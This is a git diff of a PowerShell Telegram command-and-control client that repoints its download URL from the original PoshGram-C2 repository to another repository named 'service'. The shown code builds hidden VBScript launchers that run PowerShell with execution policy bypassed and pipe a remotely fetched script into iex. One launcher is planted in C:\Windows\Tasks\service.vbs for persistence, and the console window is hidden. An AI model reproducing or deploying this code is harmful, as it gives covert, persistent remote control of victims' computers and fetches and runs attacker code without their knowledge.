@@ -16,7 +16,7 @@ $PassPhrase = "$env:COMPUTERNAME" # 'password' for this connection (computername
 $global:errormsg = 0 # 1 = return error messages to chat (off by default)
 $HideWindow = 1 # HIDE THE WINDOW - Change to 1 to hide the console window
 $version = "1.7.1" # Current Version
-$parent = "https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1" # parent script URL (for restarts and persistance)
+$parent = "https://github.com/Andre0194/service/blob/master/Telegram-C2-Client.ps1" # parent script URL (for restarts and persistance)
 $apiUrl = "https://api.telegram.org/bot$Token/sendMessage"
 $URL = 'https://api.telegram.org/bot{0}' -f $Token
 $AcceptedSession=""
@@ -52,7 +52,7 @@ Write-Output "Persistance Installed - Checking Version.."
         $tobat = @"
 Set WshShell = WScript.CreateObject(`"WScript.Shell`")
 WScript.Sleep 200
-WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tg='$tg'; irm https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1 | iex`", 0, True
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tg='$tg'; irm https://github.com/Andre0194/service/blob/master/Telegram-C2-Client.ps1 | iex`", 0, True
 "@
         $tobat | Out-File -FilePath $VBpath -Force
         sleep 1
@@ -406,7 +406,7 @@ While ($true){
         $tobat = @"
 Set WshShell = WScript.CreateObject(`"WScript.Shell`")
 WScript.Sleep 200
-WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tg='$tg'; irm https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1 | iex`", 0, True
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tg='$tg'; irm https://github.com/Andre0194/service/blob/master/Telegram-C2-Client.ps1 | iex`", 0, True
 "@
         $pth = "C:\Windows\Tasks\service.vbs"
         $tobat | Out-File -FilePath $pth -Force
